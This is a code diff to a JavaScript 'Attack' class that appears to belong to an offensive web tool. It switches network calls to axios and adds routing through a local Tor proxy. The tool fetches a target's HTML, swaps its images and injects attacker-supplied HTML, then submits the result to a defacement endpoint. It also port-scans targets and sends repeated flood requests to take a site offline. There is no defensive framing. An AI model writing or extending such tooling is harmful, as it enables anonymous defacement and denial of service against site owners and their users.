@@ -1,3 +1,5 @@
+import axios from 'axios';
+
 class Attack {
   constructor(target, type, options = {}) {
     this.target = target;
@@ -12,7 +14,8 @@ class Attack {
       timeElapsed: 0,
       errors: 0,
       lastError: null,
-      openPorts: []
+      openPorts: [],
+      defacementStatus: 'Ready',
     };
     this.intervalId = null;
     this.attackInstance = null;
@@ -22,6 +25,16 @@ class Attack {
     this.isTor = this.target.includes('.onion');
     this.abortController = new AbortController();
     this.dataBuffer = [];
+    this.axiosInstance = axios.create({
+      timeout: 10000,
+    });
+    this.axiosTorInstance = axios.create({
+      proxy: {
+        host: '127.0.0.1', // Default Tor proxy address
+        port: 9050, // Default Tor proxy port
+      },
+      timeout: 10000,
+    });
   }
 
   async start() {
@@ -102,32 +115,31 @@ class Attack {
 
   async executeDefacement() {
     this.stats.status = 'Preparing Defacement';
+    this.stats.defacementStatus = 'Fetching Target HTML';
     try {
       let response;
-      if (this.isTor) {
-        response = await fetch('/tor-proxy', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            target: this.target
-          }, null, 2),
-          signal: this.abortController.signal
+      const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
+
+      try {
+        response = await axiosClient.get(this.target, {
+          signal: this.abortController.signal,
+          responseType: 'text',
+          timeout: 15000,
         });
-      } else {
-        response = await fetch(this.target, {
-          mode: 'cors',
-          signal: this.abortController.signal
-        });
+      } catch (networkError) {
+        this.stats.defacementStatus = 'Network Error';
+        this.handleAttackError(new Error(`Network error: ${networkError.message}`));
+        return;
       }
 
-      if (!response.ok) {
-        this.stats.status = 'Unresponsive';
+      if (response.status !== 200) {
+        this.stats.defacementStatus = 'Unresponsive';
         this.handleAttackError(new Error(`Target unresponsive: ${response.status}`));
         return;
       }
-      let html = await response.text();
+
+      let html = response.data;
+      this.stats.defacementStatus = 'Modifying HTML';
 
       if (this.options.imageReplacement) {
         const imageRegex = /<img.*?src="(.*?)".*?>/gi;
@@ -143,27 +155,39 @@ class Attack {
         const closingBodyRegex = /(<\/body>)/i;
         html = html.replace(closingBodyRegex, `${this.options.htmlInjection}</body>`);
       }
-      this.stats.status = 'Submitting Defacement';
 
-      const submitResponse = await fetch('/defacement', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          target: this.target,
-          html: html
-        }, null, 2),
-        signal: this.abortController.signal
-      });
+      this.stats.defacementStatus = 'Submitting Defacement';
+      try {
+          const submitResponse = await fetch('/defacement', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                  target: this.target,
+                  html: html
+              }, null, 2),
+              signal: this.abortController.signal
+          });
 
-      if (!submitResponse.ok) {
-        throw new Error(`Defacement submission failed: ${submitResponse.status}`);
+          if (!submitResponse.ok) {
+              throw new Error(`Defacement submission failed: ${submitResponse.status}`);
+          }
+
+          this.stats.defacementStatus = 'Defaced';
+      } catch (submissionError) {
+          this.stats.defacementStatus = 'Submission Failed';
+          this.handleAttackError(new Error(`Defacement submission error: ${submissionError.message}`));
+          return;
       }
 
+
       this.stats.status = 'Defaced';
+      this.stats.defacementStatus = 'Complete';
+
     } catch (error) {
       console.error('Defacement failed:', error);
+      this.stats.defacementStatus = 'Failed';
       this.handleAttackError(error);
     }
   }
@@ -185,16 +209,13 @@ class Attack {
       this.stats.status = `Scanning Port ${port}`;
       try {
         let response;
-        if (this.isTor) {
-          response = await fetch(`/tor-portscan?target=${this.target}&port=${port}`, {
-            signal: this.abortController.signal
-          });
-        } else {
-          response = await fetch(`/portscan?target=${this.target}&port=${port}`, {
-            signal: this.abortController.signal
-          });
-        }
-        const data = await response.json();
+        const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
+        response = await axiosClient.get(`/portscan?target=${this.target}&port=${port}`, {
+          signal: this.abortController.signal,
+          timeout: 5000
+        });
+
+        const data = response.data;
         if (data.open) {
           console.log(`Port ${port} is open`);
           this.stats.openPorts.push(port);
@@ -240,13 +261,13 @@ class Attack {
     this.stats.mbps = this.calculateMbps();
     this.stats.packetsSent += Math.floor(Math.random() * 1500);
 
-    const corsMode = this.isTor ? 'no-cors' : 'cors';
-    fetch(this.target, {
-        mode: corsMode,
-        signal: this.abortController.signal
+    const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
+    axiosClient.get(this.target, {
+        signal: this.abortController.signal,
+        timeout: 5000
       })
       .then(response => {
-        this.stats.status = response.ok ? 'Online' : 'Unresponsive';
+        this.stats.status = response.status === 200 ? 'Online' : 'Unresponsive';
       })
       .catch((error) => {
         this.stats.status = 'Offline';
